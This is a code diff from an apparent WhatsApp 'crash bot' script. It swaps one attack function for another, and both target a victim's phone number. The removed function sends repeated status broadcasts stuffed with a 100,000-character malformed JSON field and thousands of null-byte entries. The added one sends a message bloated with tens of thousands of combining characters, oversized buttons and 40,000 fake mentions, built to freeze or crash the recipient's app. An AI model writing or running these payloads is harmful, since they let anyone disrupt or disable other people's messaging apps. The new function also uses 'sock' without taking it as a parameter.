@@ -4812,7 +4812,7 @@ Description : Android Delay Invisible
             
             for (let i = 0; i < 3; i++) {
                 try {
-                    await PriasoloDelayinvis(sock, target);
+                    await PriaSoloBlank(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -5497,75 +5497,73 @@ async function VogueBuldo(sock, target) {
 }
 }
 
-async function PriasoloDelayinvis(sock, target) {
-  for (let i = 0; i < 20; i++) {
-    await sock.relayMessage(
-      "status@broadcast",
-      {
-        imageMessage: {
-          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
-          mimetype: "image/jpeg",
-          fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
-          fileLength: "98",
-          height: 4,
-          width: 4,
-          mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
-          fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
-          directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
-          mediaKeyTimestamp: "1749728782"
-        },
-        hasMediaAttachment: true,
-        nativeFlowMessage: {
-          messageParamsJson: ""
-        },
-        messageContextInfo: {
-          deviceListMetadata: {},
-          deviceListMetadataVersion: 2
-        },
-        interactiveResponseMessage: {
-          body: {
-            text: "",
-            format: "DEFAULT"
-          },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "}".repeat(100000),
-            version: 3
-          },
-          contextInfo: {
-            remoteJid: "K",
-            urlTrackingMap: {
-              urlTrackingMapElements: Array.from({ length: 4000 }, () => ({
-                "\u0000": "\u0000"
-              }))
-            }
-          }
-        }
-      },
-      {
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: { status_setting: "contacts" },
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: []
-                  }
-                ]
-              }
-            ]
-          }
-        ]
-      }
-    );
-  }
+async function PriaSoloBlank(target) {
+  const ButtonsX = [];
+
+  for (let i = 0; i < 10; i++) {
+    ButtonsX.push({
+      buttonId: "cta_copy",
+      buttonText: {
+        displayText: "ꦽ".repeat(5000),
+      },
+      type: 4,
+      nativeFlowInfo: {
+        name: "single_select",
+        paramsJson: JSON.stringify({
+          title: "ꦽ".repeat(5000),
+          sections: [
+            {
+              title: "Pria Solo",
+              highlight_label: "label",
+              rows: [],
+            },
+          ],
+        }),
+      },
+    });
+  }
+
+  await sock.sendMessage(
+    target,
+    {
+      text: "ꦽ".repeat(25000),
+      footer: "Pria Solo" + "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
+      viewOnce: true,
+      buttons: ButtonsX,
+      headerType: 1,
+      contextInfo: {
+        participant: target,
+        mentionedJid: [
+          "131338822@s.whatsapp.net",
+          ...Array.from(
+            { length: 40000 },
+            () =>
+              "1" +
+              Math.floor(Math.random() * 5000000) +
+              "@s.whatsapp.net"
+          ),
+        ],
+        remoteJid: "X",
+        forwardingScore: 100,
+        isForwarded: true,
+        stanzaId: "1234567890ABCDEF",
+        quotedMessage: {
+          paymentInviteMessage: {
+            serviceType: 3,
+            expiryTimestamp: Date.now() + 1814400000,
+          },
+        },
+        businessMessageForwardInfo: {
+          businessOwnerJid: target,
+        },
+      },
+    },
+    {
+      ephemeralExpiration: 5,
+      timeStamp: Date.now(),
+      participant: { jid: target },
+    }
+  );
 }
 
 
